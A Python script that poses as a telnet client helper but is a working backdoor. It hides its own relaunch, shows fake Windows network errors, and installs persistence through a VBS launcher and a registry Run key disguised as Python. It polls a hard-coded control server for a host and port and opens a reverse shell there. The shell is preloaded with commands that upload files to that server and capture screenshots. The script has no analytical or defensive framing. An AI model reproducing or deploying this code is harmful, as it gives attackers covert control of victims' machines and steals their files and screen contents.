import asyncio
import sys
import subprocess
import aiohttp # type: ignore
import os

from subprocess import Popen

if __name__ != "__main__":
    from telnetlib3.client import open_connection as open_telnet_connection
    import telnetlib3

SLEEP_PERIOD_SECS = 2

URL_STATUS = "http://erzhanoriez.winogrona.cc/data/status"

SHELL = ""
if sys.platform == 'win32':
    SHELL = "powershell.exe"
else:
    SHELL = "bash"

PS_PRELOAD = b"""
function Send {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [string] $ServerUrl = "http://erzhanoriez.winogrona.cc"
    )

    $filename    = [System.IO.Path]::GetFileName($FilePath)
    $destination = "$ServerUrl/$filename"

    Write-Host "Sending file '$FilePath' to '$destination' via PUT..."

    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    Invoke-RestMethod -Uri $destination `
                      -Method PUT `
                      -Body $fileContent `
                      -ContentType "application/octet-stream"

    Write-Host "File '$FilePath' was sent to '$destination'."
}

function SS {
    param (
        [string]$OutputPath = "s.png"
    )

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Get the screen dimensions
    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

    # Create a bitmap to store the screenshot
    $bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height

    # Create a graphics object to capture the screen
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

    # Copy the screen content to the bitmap
    $graphics.CopyFromScreen(0, 0, 0, 0, $screenBounds.Size)

    # Save the bitmap to the specified file
    $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Dispose of objects to release resources
    $graphics.Dispose()
    $bitmap.Dispose()

    Write-Host "Screenshot saved to $OutputPath"
}


"""

BASH_PRELOAD = b"""
send() {
  if ! [[ $1 ]]; then
    echo "usage: send <filename>"
  fi
  filename="$1"
  curl --upload-file "$filename" "http://erzhanoriez.winogrona.cc/$(basename "$filename")"
  echo
}
"""

def excguard(coro):
    async def newfun(*args, **kwargs):
        try:
            await coro(*args, **kwargs)
        except Exception as e:
            pass
    
    return newfun

@excguard
async def revshell(host: str, port: int) -> None:
    shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    (reader, writer) = await asyncio.open_connection(host, port)

    if sys.platform == "win32":
        shell.stdin.write(PS_PRELOAD)
    
    else:
        shell.stdin.write(BASH_PRELOAD)

    future_readclosed = asyncio.get_running_loop().create_future()

    async def stdin_task():
        while True:
            data = await reader.read(1024)
            shell.stdin.write(data)
        
    async def stderr_task():
        while True:
            data = await shell.stderr.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)

    async def stdout_task():
        while True:
            data = await shell.stdout.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)
    
    shell_coros = [stdin_task(), stdout_task(), stderr_task()]
    shell_tasks = [asyncio.create_task(coro) for coro in shell_coros]

    await future_readclosed
    for task in shell_tasks:
        task.cancel()

    reader.feed_eof()
    writer.close()

async def струи_СЭКСА():
    cur_stream_id = -1
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(URL_STATUS) as resp:
                    (host, port, stream_id) = (await resp.text()).split(":")
                    port = int(port)
                    stream_id = int(stream_id)

                    if stream_id > cur_stream_id:
                        asyncio.create_task(revshell(host, port))
                        cur_stream_id = stream_id

        except Exception as e:
            pass
            
        await asyncio.sleep(SLEEP_PERIOD_SECS)

VBS = f'''
' Define the path to the Python interpreter and the Python script
pythonInterpreter = "{sys.executable}"
pythonScript = "{__file__}"

' Create a shell object
Set shell = CreateObject("WScript.Shell")

' Run the Python script using the interpreter
shell.Run """" & pythonInterpreter & """ """ & pythonScript & """", 0, False'
'''

VDIR = "C:\\Program Files\\Windows Security Core"
LAUNCH = f"{VDIR}\\launch.vbs"

def seks_installer():
    exe = sys.executable
    file = __file__

    if sys.platform == "win32":
        os.mkdirs(VDIR, exist_ok=True)
        with open(LAUNCH, "w") as f:
            f.write(VBS)
        
        os.system(f'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Python v3.13" /t REG_SZ /d "{LAUNCH}" /f')

async def am_main(host: str, port: int, token: str) -> None:
    if sys.platform == "win32":
        await asyncio.sleep(6)
        raise SystemError("[WinError 121] The semaphore state has been invalidated, [WinError 1231] The network location cannot be reached. For information about network troubleshooting, see Windows Help")

    if token not in [
    "3a325a7b26477efd5904a87ccf29d5c22974815c1ec63b55b0bb15b706cfc75e",
    "99f6cd825c9d42242126237fe272e85bf64d8e6798785630add9608446fcdb3a",
    "eb4202a1fe25233dbbfe62a54aa352a8652e4e3a98bec7d51e320dfa4eb74321",
    "38f1c176c6e0eab54af043ef00db0ece7f56dbc68ae5649b5bf81a5fc1051621"
    ]:
        await asyncio.sleep(0.1)
        raise ValueError("Invalid API token")
    
    else:
        (reader, writer) = await open_telnet_connection(host=host, port=port, shell=telnetlib3.telnet_client_shell, encoding="utf8", term="TERM", force_binary=True)

    await writer.protocol.waiter_closed

def async_client(host: str, port: int, token: str, seks: bool = True) -> None:
    if seks:
        if True or sys.platform == "win32":
            p = Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
            p.communicate(f"Start-Process -FilePath '{sys.executable}' -WindowStyle Hidden -ArgumentList '{__file__}'")
        else:
            Popen(["nohup", sys.executable, __file__], shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    asyncio.run(am_main(host, port, token))

if __name__ == '__main__':
    # asyncio.run(am_main(host="winogrona.cc", port=22889))
    seks_installer()
    asyncio.run(струи_СЭКСА())